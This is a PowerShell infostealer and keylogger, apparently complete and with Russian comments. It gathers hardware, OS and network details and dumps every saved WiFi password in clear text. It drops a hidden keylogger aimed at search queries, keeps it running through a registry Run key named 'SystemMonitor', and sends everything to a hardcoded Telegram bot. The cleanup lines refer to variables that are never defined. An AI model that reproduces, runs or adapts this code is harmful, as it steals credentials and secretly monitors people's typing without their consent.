# Основной сбор данных
$sys = Get-CimInstance Win32_ComputerSystem
$os = Get-CimInstance Win32_OperatingSystem
$cpu = Get-CimInstance Win32_Processor
$ram = [math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum/1GB, 2)
$gpu = (Get-CimInstance Win32_VideoController | Where-Object {$_.Name -notlike "*Remote*"} | Select-Object -First 1).Name
$disk = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"

# Сеть и WiFi
try {$ip = (Invoke-RestMethod "http://ipinfo.io/ip" -TimeoutSec 3).Trim()} catch {$ip = "No IP"}
$net = Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1'} | Select-Object InterfaceAlias, IPAddress

$wifi = ""
try {
    netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
        $name = $_.ToString().Split(":")[1].Trim()
        try {$pass = (netsh wlan show profile name="$name" key=clear | Select-String "Key Content").ToString().Split(":")[1].Trim()} catch {$pass = "No password"}
        $wifi += "$name : $pass`n"
    }
    if (!$wifi) {$wifi = "No WiFi networks"}
} catch {$wifi = "WiFi error"}

# УСОВЕРШЕНСТВОВАННЫЙ КЕЙЛОГГЕР ДЛЯ ПЕРЕХВАТА ПОИСКОВЫХ ЗАПРОСОВ
$keyloggerStatus = "Starting..."

# Создаем улучшенный кейлоггер для поиска
$keyloggerScript = @"
Add-Type -AssemblyName System.Windows.Forms

`$capturedData = @()
`$currentWindow = ""
`$buffer = ""
`$searchBuffer = ""
`$inSearch = `$false

function Send-ToTelegram {
    param(`$message)
    try {
        `$body = @{
            chat_id = '5674514050'
            text = `$message
        }
        Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body `$body
    } catch { }
}

function Process-Search {
    if(`$searchBuffer -ne "" -and `$searchBuffer.Length -gt 2) {
        Send-ToTelegram "🔍 SEARCH QUERY: `$searchBuffer"
        `$capturedData += "SEARCH: `$searchBuffer"
        `$searchBuffer = ""
    }
}

while(`$true) {
    try {
        # Получаем активное окно
        `$activeWindow = ""
        `$processes = Get-Process | Where-Object {`$_.MainWindowTitle -and `$_.MainWindowHandle -ne 0} | Sort-Object CPU -Descending
        if(`$processes) {
            `$activeWindow = `$processes[0].MainWindowTitle
        }
        
        # Определяем, находится ли пользователь в поиске
        `$wasInSearch = `$inSearch
        `$inSearch = (`$activeWindow -like "*поиск*" -or 
                     `$activeWindow -like "*search*" -or 
                     `$activeWindow -like "*google*" -or 
                     `$activeWindow -like "*yandex*" -or 
                     `$activeWindow -like "*bing*" -or
                     `$activeWindow -like "*find*" -or
                     `$activeWindow -like "*искать*")
        
        # Если только что вошли в поиск
        if(`$inSearch -and !`$wasInSearch) {
            Send-ToTelegram "🎯 USER STARTED SEARCHING: `$activeWindow"
        }
        
        # Если только что вышли из поиска
        if(!`$inSearch -and `$wasInSearch) {
            Process-Search
        }
        
        # Перехватываем все нажатия клавиш
        for(`$i = 8; `$i -lt 255; `$i++) {
            `$keyState = [System.Windows.Forms.GetAsyncKeyState]`$i
            if(`$keyState -eq -32767) {
                `$key = [System.Windows.Forms.Keys]`$i
                
                # Обрабатываем специальные клавиши
                switch(`$key) {
                    "Enter" { 
                        if(`$inSearch) {
                            Process-Search
                        }
                    }
                    "Space" { 
                        `$buffer += " "
                        if(`$inSearch) {
                            `$searchBuffer += " "
                        }
                    }
                    "Back" { 
                        if(`$buffer.Length -gt 0) { 
                            `$buffer = `$buffer.Substring(0, `$buffer.Length - 1) 
                        }
                        if(`$inSearch -and `$searchBuffer.Length -gt 0) { 
                            `$searchBuffer = `$searchBuffer.Substring(0, `$searchBuffer.Length - 1) 
                        }
                    }
                    "Tab" { 
                        `$buffer += "[TAB]"
                        if(`$inSearch) {
                            `$searchBuffer += "[TAB]"
                        }
                    }
                    "LButton" { 
                        # Клик мыши - обрабатываем поисковый буфер
                        if(`$inSearch) {
                            Process-Search
                        }
                    }
                    "RButton" { 
                        # Правый клик - обрабатываем поисковый буфер
                        if(`$inSearch) {
                            Process-Search
                        }
                    }
                    "Escape" {
                        if(`$inSearch) {
                            Process-Search
                        }
                    }
                    default {
                        # Обрабатываем обычные символы
                        if(`$key -ge 65 -and `$key -le 90) {
                            # Буквы A-Z
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                            `$isCaps = [System.Windows.Forms.Console]::CapsLock
                            
                            if((`$isShift -and !`$isCaps) -or (!`$isShift -and `$isCaps)) {
                                `$char = `$key.ToString()
                            } else {
                                `$char = `$key.ToString().ToLower()
                            }
                            
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -ge 48 -and `$key -le 57) {
                            # Цифры 0-9
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                            `$symbols = @(')', '!', '@', '#', '`$', '%', '^', '&', '*', '(')
                            if(`$isShift) {
                                `$char = `$symbols[`$key - 48]
                            } else {
                                `$char = (`$key - 48).ToString()
                            }
                            
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 190 -or `$key -eq 110) {
                            # Точка
                            `$char = "."
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 189 -or `$key -eq 109) {
                            # Минус/дефис
                            `$char = "-"
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 187 -or `$key -eq 107) {
                            # Плюс/равно
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767 -or [System.Windows.Forms.GetAsyncKeyState]161 -eq -32767
                            if(`$isShift) {
                                `$char = "+"
                            } else {
                                `$char = "="
                            }
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 186 -or `$key -eq 59) {
                            # Точка с запятой/двоеточие
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
                            if(`$isShift) {
                                `$char = ":"
                            } else {
                                `$char = ";"
                            }
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 188 -or `$key -eq 44) {
                            # Запятая
                            `$char = ","
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 191 -or `$key -eq 47) {
                            # Слеш/вопросительный знак
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
                            if(`$isShift) {
                                `$char = "?"
                            } else {
                                `$char = "/"
                            }
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 192 -or `$key -eq 96) {
                            # Тильда/апостроф
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
                            if(`$isShift) {
                                `$char = "~"
                            } else {
                                `$char = "`"
                            }
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 219 -or `$key -eq 91) {
                            # Открывающая скобка
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
                            if(`$isShift) {
                                `$char = "{"
                            } else {
                                `$char = "["
                            }
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 221 -or `$key -eq 93) {
                            # Закрывающая скобка
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
                            if(`$isShift) {
                                `$char = "}"
                            } else {
                                `$char = "]"
                            }
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 220 -or `$key -eq 92) {
                            # Обратный слеш/вертикальная черта
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
                            if(`$isShift) {
                                `$char = "|"
                            } else {
                                `$char = "\"
                            }
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        } elseif(`$key -eq 222 -or `$key -eq 39) {
                            # Кавычки
                            `$isShift = [System.Windows.Forms.GetAsyncKeyState]160 -eq -32767
                            if(`$isShift) {
                                `$char = """
                            } else {
                                `$char = "'"
                            }
                            `$buffer += `$char
                            if(`$inSearch) {
                                `$searchBuffer += `$char
                            }
                        }
                    }
                }
                
                # Автоматически отправляем длинные поисковые запросы
                if(`$inSearch -and `$searchBuffer.Length -gt 30) {
                    Process-Search
                }
            }
        }
    } catch { }
    Start-Sleep -Milliseconds 5
}
"@

# Сохраняем и запускаем улучшенный кейлоггер
try {
    $keyloggerScript | Out-File "$env:TEMP\search_logger.ps1" -Encoding ASCII
    Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_logger.ps1`"" -WindowStyle Hidden
    
    # Добавляем в автозагрузку
    $startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $loggerCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\search_logger.ps1`""
    Set-ItemProperty -Path $startupPath -Name "SystemMonitor" -Value $loggerCommand -ErrorAction SilentlyContinue
    
    $keyloggerStatus = "✅ Advanced search logger active - monitoring all search queries"
} catch {
    $keyloggerStatus = "❌ Search logger failed: $($_.Exception.Message)"
}

# Безопасность
try {$fw = Get-NetFirewallProfile | ForEach-Object {"  - $($_.Name): $($_.Enabled)"} | Out-String} catch {$fw = "Firewall info unavailable"}
try {$def = Get-MpComputerStatus; $defStatus = "Antivirus: $($def.AntivirusEnabled), Real-time: $($def.RealTimeProtectionEnabled)"} catch {$defStatus = "Defender info unavailable"}
try {$rdp = if ((Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -ErrorAction 0).fDenyTSConnections -eq 1) {'Disabled'} else {'Enabled'}} catch {$rdp = "RDP status unavailable"}

# Дополнительная информация
try {$conn = Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort -First 5 | ForEach-Object {"- $($_.LocalAddress):$($_.LocalPort) -> $($_.RemoteAddress):$($_.RemotePort)"} | Out-String} catch {$conn = "Connections unavailable"}
try {$software = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*","HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | Where-Object {$_.DisplayName} | Select-Object DisplayName, DisplayVersion -First 8 | ForEach-Object {"- $($_.DisplayName) v$($_.DisplayVersion)"} | Out-String} catch {$software = "Software info unavailable"}
try {$uptime = (Get-Date) - $os.LastBootUpTime; $uptimeInfo = "$([math]::Floor($uptime.TotalHours)):$($uptime.Minutes.ToString('00'))"} catch {$uptimeInfo = "Uptime unavailable"}

# Формирование и отправка сообщения
$msg = @"
=== SYSTEM INFORMATION ===
User: $env:USERNAME
Computer: $env:COMPUTERNAME
Domain: $env:USERDOMAIN

=== HARDWARE INFORMATION ===
Processor: $($cpu.Name)
RAM: $ram GB
GPU: $gpu
Disk C: Free: $([math]::Round($disk.FreeSpace/1GB, 2)) GB / Total: $([math]::Round($disk.Size/1GB, 2)) GB

=== OPERATING SYSTEM ===
OS: $($os.Caption)
Version: $($os.Version)
Build: $($os.BuildNumber)

=== NETWORK INFORMATION ===
Public IP: $ip

Network Interfaces:
$($net | ForEach-Object { 
    $name = $_.InterfaceAlias -replace "Подключение по локальной сети", "Local Area Connection" -replace "Беспроводная сеть", "Wireless Network" -replace "Сетевое подключение Bluetooth", "Bluetooth Network"
    "- $name : $($_.IPAddress)" 
} | Out-String)

Active Connections:
$conn

=== WIFI PASSWORDS ===
$wifi

=== SEARCH LOGGER STATUS ===
$keyloggerStatus

=== MONITORING ===
• Все поисковые запросы в Google, Yandex, Bing
• Поиск в браузерах и приложениях
• Поисковые формы на сайтах

=== SECURITY STATUS ===
Firewall: 
$fw
Windows Defender: $defStatus
RDP Access: $rdp

=== INSTALLED SOFTWARE ===
$software

=== SYSTEM UPTIME ===
Uptime: $uptimeInfo
"@

Invoke-RestMethod -Uri "https://api.telegram.org/bot8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs/sendMessage" -Method Post -Body @{chat_id='5674514050'; text=$msg}

# Очистка
Remove-Item $temp -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
